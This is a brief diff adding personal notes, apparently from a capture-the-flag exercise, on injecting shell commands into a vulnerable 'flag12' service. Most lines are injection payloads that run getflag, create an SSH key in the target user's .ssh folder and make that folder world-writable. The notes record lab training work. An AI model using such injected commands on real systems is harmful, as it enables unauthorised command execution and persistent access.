@@ -1,0 +1,7 @@
+If not hash, found in google.
+inject a command!
+; getflag > /home/flag12; echo asd
+gg
+
+; echo -e "/home/flag12/.ssh/id_rsa\n\n\n" | ssh-keygen; echo asd
+; chmod 777 /home/flag12/.ssh;
